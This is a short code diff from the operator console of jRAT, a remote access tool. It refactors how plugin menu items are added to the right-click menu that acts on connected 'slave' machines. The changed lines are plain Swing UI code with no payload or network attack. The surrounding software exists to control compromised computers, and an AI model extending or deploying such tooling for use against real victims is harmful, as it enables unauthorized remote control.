@@ -29,14 +29,12 @@ import javax.swing.table.DefaultTableModel;
 
 import jrat.api.RATMenuItem;
 import jrat.api.RATObject;
-import jrat.api.RATPlugin;
 import se.jrat.common.downloadable.Downloadable;
 import se.jrat.common.utils.DataUnits;
 import se.jrat.controller.AbstractSlave;
 import se.jrat.controller.Main;
 import se.jrat.controller.Slave;
 import se.jrat.controller.Status;
-import se.jrat.controller.addons.Plugins;
 import se.jrat.controller.addons.RATObjectFormat;
 import se.jrat.controller.listeners.CountryMenuItemListener;
 import se.jrat.controller.net.URLParser;
@@ -887,34 +885,28 @@ public class PanelMainClients extends JScrollPane {
 			}
 		});
 
-		for (RATPlugin plugin : Plugins.getPlugins()) {
-			if (plugin.getMenuItems() != null && plugin.getMenuItems().size() > 0) {
-				popupMenu.addSeparator();
-				break;
-			}
+		if (RATMenuItem.getEntries().size() > 0) {
+			popupMenu.addSeparator();
 		}
-		for (RATPlugin plugin : Plugins.getPlugins()) {
-			if (plugin.getMenuItems() != null && plugin.getMenuItems().size() > 0) {
-				for (final RATMenuItem en : plugin.getMenuItems()) {
-					JMenuItem item = en.getItem();
 
-					item.addActionListener(new ActionListener() {
-						public void actionPerformed(ActionEvent e) {
-							List<AbstractSlave> list = getSelectedSlaves();
-							List<RATObject> servers = new ArrayList<RATObject>();
-							for (int i = 0; i < list.size(); i++) {
-								servers.add(RATObjectFormat.format(list.get(i)));
-							}
+		for (final RATMenuItem ritem : RATMenuItem.getEntries()) {
+			JMenuItem item = ritem.getItem();
 
-							en.getListener().onClick(servers);
-						}
-					});
-					
-					popupMenu.add(item);
+			item.addActionListener(new ActionListener() {
+				public void actionPerformed(ActionEvent e) {
+					List<AbstractSlave> list = getSelectedSlaves();
+					List<RATObject> servers = new ArrayList<RATObject>();
+					for (int i = 0; i < list.size(); i++) {
+						servers.add(RATObjectFormat.format(list.get(i)));
+					}
+
+					ritem.getListener().onClick(servers);
 				}
-			}
+			});
+
+			popupMenu.add(item);
 		}
-		
+
 		return popupMenu;
 	}
 
